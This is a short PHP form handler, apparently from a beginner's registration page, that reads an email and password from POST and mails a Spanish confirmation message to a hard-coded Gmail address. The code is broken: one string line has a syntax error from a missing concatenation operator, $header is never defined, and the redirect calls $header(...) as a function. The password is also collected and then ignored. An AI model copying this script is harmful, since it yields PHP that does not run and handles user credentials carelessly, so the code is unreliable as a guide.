<?php

$email = $_POST['email'];
$password = $_POST['password'];

$mensaje = "Su registro fue satisfactorio" "\r\n";
$mensaje .="Su email es: " . $email . "\r\n";

$para = 'bider.10@gmail.com';
$asunto = 'Mensaje de mi sitio web';

mail($para, $asunto, utf8_decode($mensaje), $header);

$header('Location:exito.html');

?>